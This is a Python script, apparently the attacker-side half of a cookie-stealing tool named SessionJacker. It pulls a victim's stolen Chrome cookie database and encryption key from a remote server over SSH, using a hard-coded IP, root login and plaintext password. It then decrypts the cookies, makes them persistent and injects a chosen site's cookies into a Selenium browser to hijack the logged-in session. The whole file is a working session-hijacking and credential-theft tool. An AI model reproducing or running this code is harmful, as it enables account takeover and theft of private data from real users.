from datetime import datetime, timedelta
from selenium import webdriver
from Crypto.Cipher import AES
import win32crypt
import paramiko
import base64
import sqlite3
import shutil
import socket
import pickle
import signal
import time
import json
import sys
import os
import io



# detect Ctrl-C
def signal_handler(sig, frame):
    # Add any cleanup code here if needed
    exit(0)

# start detect Ctrl-C function
signal.signal(signal.SIGINT, signal_handler)




# receive cookie file and key file from victim
def receive_files(hostname, port, username, password, local_directory):
    print("\n- Waiting for Cookies...\n\n")
    # SSH client configuration
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    all_files_downloaded = False

    while not all_files_downloaded:
        try:
            # Connect to the Linux server
            client.connect(hostname, port=port, username=username, password=password)

            # Create an SFTP client
            sftp = client.open_sftp()

            # Files to download
            remote_files = ['Cookies.db', 'encryption_key.bin']

            all_files_downloaded = True  # Assume all files are downloaded initially

            for filename in remote_files:
                remote_file = os.path.join('', filename)
                local_file = os.path.join(local_directory, filename)

                try:
                    # Check if the remote file exists
                    sftp.stat(remote_file)
                    print(f'- Downloading: {remote_file}')
                    print("\n")
                    sftp.get(remote_file, local_file)
                except FileNotFoundError:
                    all_files_downloaded = False  # Update the flag if any file is not found

            # Close the SFTP connection
            sftp.close()

        except Exception as e:
            print(f'Error: {str(e)}')

        finally:
            # Close the SSH connection
            client.close()

        if all_files_downloaded:
            break  # All files have been downloaded, exit the loop and quit the program

        # Delay between iterations
        time.sleep(1)  # 1 second



# open session in browser with selenium
def open_session(target_cookies, cookies, site):
    browser = webdriver.Chrome()
    if site[0] == ".":
        site = site[1:]
    browser.get("https://" + site)
    for cookie in target_cookies:
        browser.add_cookie(cookie)
    browser.refresh()
    
    while True:
    # Check if the browser window is still open
        if not browser.window_handles:
            break

    os.system('cls')
    print('\n\n')
    # return to list
    list_and_attack(cookies)



# filter cookie list based on site
def filter_cookies(cookies, site):
    target_cookies = [cookie for cookie in cookies if cookie['host_key'] == site]
    return [{k: v for k, v in cookie.items() if k in ['name', 'value']} for cookie in target_cookies]



# get list of all sites
def get_site_list(cookies):
    session_list = {cookie['host_key'] for cookie in cookies}
    return session_list



# decrypt data with key
def decrypt_data(data, key):
    try:
        # get the initialization vector
        iv = data[3:15]
        data = data[15:]
        # generate cipher
        cipher = AES.new(key, AES.MODE_GCM, iv)
        # decrypt password
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(data, None, None, None, 0)[1])
        except:
            # not supported
            return "Decryption method not supported"


# display site list & select session to hijack
def list_and_attack(cookies):
    print(' SESSION COOKIES\n')
    session_list = sorted(get_site_list(cookies))
    for item in session_list:
        print(' ' + item)
    site = input('\n\n Select session: ')
    print('\n\n Using Cookies:\n\n')
    for item in filter_cookies(cookies, site):
        print(' ' + f"{item['name']}: {item['value']}")
    print('\n\n Hijacking session: ' + site + '\n\n')
    target_cookies = filter_cookies(cookies, site)
    open_session(target_cookies, cookies, site)



def main():


    
    # SSH connection details for the Linux server
    hostname = '139.162.253.129'
    port = 22
    username = 'root'
    password = 'd2fycmvu1984'

    # local directory where you want to save the downloaded files
    local_directory = ("C:\\Users\\bigworm\\Desktop\\SessionJacker\\powershell-remote\\files")

    # relative file path instead of absolute
    # local_directory = os.path.join(os.getcwd(), "files")

    # Call the download_files function
    receive_files(hostname, port, username, password, local_directory)
    



    print('\n- Decrypting Cookies\n\n\n')

    filename = "files/Cookies.db"
    # connect to the database
    db = sqlite3.connect(filename)
    # ignore decoding errors
    db.text_factory = lambda b: b.decode(errors="ignore")
    cursor = db.cursor()
    
    # get all cookies from cookie table'
    cursor.execute("""
    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
    FROM cookies""")
    
    # read the key from the file
    with open('files/encryption_key.bin', 'rb') as f:
        key = f.read()
    
    # initialise cookie list
    cookie_list = []

    for row in cursor.fetchall():
        cookie = {}  # create a new dictionary for each row
        host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value = row

        # if not decrypted
        if not value:
            # then decrypt
            decrypted_value = decrypt_data(encrypted_value, key)

        else:
            # if already decrypted
            decrypted_value = value

        # add each column to the cookie dictionary
        cookie['host_key'] = host_key
        cookie['name'] = name
        cookie['value'] = decrypted_value
        cookie['creation_utc'] = creation_utc
        cookie['last_access_utc'] = last_access_utc
        cookie['expires_utc'] = expires_utc
        
        # append the cookie list to the master list (list of lists)
        cookie_list.append(cookie)
    
        # update the cookies table with the decrypted value
        # and make session cookie persistent
        cursor.execute("""
        UPDATE cookies SET value = ?, has_expires = 1, expires_utc = 99999999999999999, is_persistent = 1, is_secure = 0
        WHERE host_key = ?
        AND name = ?""", (decrypted_value, host_key, name))

    # commit changes
    db.commit()
    # close connection
    db.close()

    # call attack function
    list_and_attack(cookie_list)





# CALL MAIN FUNCTION 
if __name__ == "__main__":
    main()